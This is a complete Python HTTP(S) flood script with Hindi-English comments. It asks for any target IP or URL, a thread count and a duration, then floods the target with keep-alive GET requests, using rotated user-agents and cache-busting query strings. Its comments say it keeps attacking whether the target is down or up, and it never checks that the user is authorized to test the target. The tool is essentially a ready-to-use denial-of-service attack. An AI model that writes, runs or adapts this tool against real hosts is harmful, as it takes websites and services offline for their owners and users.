#!/usr/bin/env python3
# flood_https.py — HTTP(S) flood stress generator
# Target IP/URL de do, threads aur duration puchhega, aur duration khatam hone tak
# target down ho ya up, flood karta rahega.

import socket
import ssl
import threading
import time
import random
import sys
from urllib.parse import urlparse

UA = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 Version/17.5 Mobile/15E148 Safari/604.1",
]

PATHS = ["/", "/index.html", "/api/v1/health", "/status", "/favicon.ico"]

class Flooder:
    def __init__(self, host, port, use_ssl, path):
        self.host = host
        self.port = port
        self.use_ssl = use_ssl
        self.path = path
        self.running = True
        self.count = 0
        self.lock = threading.Lock()
        # IP par chal raha hai to cert verify nahi karenge (IP certs match nahi karte)
        self.ctx = ssl.create_default_context()
        self.ctx.check_hostname = False
        self.ctx.verify_mode = ssl.CERT_NONE

    def _connect(self):
        raw = socket.create_connection((self.host, self.port), timeout=5)
        if self.use_ssl:
            return self.ctx.wrap_socket(raw, server_hostname=self.host)
        return raw

    def run(self):
        while self.running:
            try:
                sock = self._connect()
                sock.settimeout(5)
                # ek hi connection par keep-alive se baar-baar request bhejo
                while self.running:
                    path = self.path + ("?" + str(random.randint(100000, 999999)) if self.path == "/" else "")
                    req = (
                        f"GET {path} HTTP/1.1\r\n"
                        f"Host: {self.host}\r\n"
                        f"User-Agent: {random.choice(UA)}\r\n"
                        "Accept: */*\r\n"
                        "Accept-Encoding: identity\r\n"
                        "Connection: keep-alive\r\n"
                        "\r\n"
                    )
                    try:
                        sock.sendall(req.encode())
                        sock.recv(4096)          # response read karo
                    except (socket.timeout, ConnectionError):
                        break                    # stale connection -> reconnect
                    with self.lock:
                        self.count += 1
                sock.close()
            except (socket.error, ssl.SSLError, OSError):
                # Target down / connection refused — koi baat nahi, retry karte raho
                time.sleep(0.05)


def parse_target(raw):
    raw = raw.strip()
    if not raw.startswith(("http://", "https://")):
        raw = "https://" + raw          # default HTTPS
    p = urlparse(raw)
    use_ssl = p.scheme == "https"
    host = p.hostname or raw
    port = p.port or (443 if use_ssl else 80)
    path = p.path or "/"
    return host, port, use_ssl, path


def stats_printer(f, start):
    while f.running:
        elapsed = time.time() - start
        with f.lock:
            n = f.count
        rate = n / elapsed if elapsed > 0 else 0
        print(f"\r[+] Requests: {n}  |  Rate: {rate:.0f} req/s  |  Time left: {max(0, int(duration - elapsed))}s  ", end="", flush=True)
        time.sleep(1)


if __name__ == "__main__":
    print("=== HTTPS Flood Stress Tool ===")
    target = input("[?] Target (IP ya URL, e.g. https://18.61.184.48/): ").strip()
    threads = int(input("[?] Threads: ").strip())
    duration = int(input("[?] Duration (seconds): ").strip())

    host, port, use_ssl, path = parse_target(target)
    print(f"[*] Target: {host}:{port} ({'HTTPS' if use_ssl else 'HTTP'}) | Threads: {threads} | Duration: {duration}s")
    print("[*] Attack start... (Ctrl+C se bhi rok sakte ho)\n")

    flooders = [Flooder(host, port, use_ssl, path) for _ in range(threads)]
    t_start = time.time()
    t_threads = [threading.Thread(target=f.run, daemon=True) for f in flooders]

    for t in t_threads:
        t.start()

    stats = threading.Thread(target=stats_printer, args=(flooders[0], t_start), daemon=True)
    stats.start()

    try:
        time.sleep(duration)
    except KeyboardInterrupt:
        pass

    # Band karo
    for f in flooders:
        f.running = False
    for t in t_threads:
        t.join(timeout=6)

    elapsed = time.time() - t_start
    with flooders[0].lock:
        total = flooders[0].count
    print(f"\n[Done] {total} requests in {elapsed:.1f}s | avg {total/elapsed:.0f} req/s")
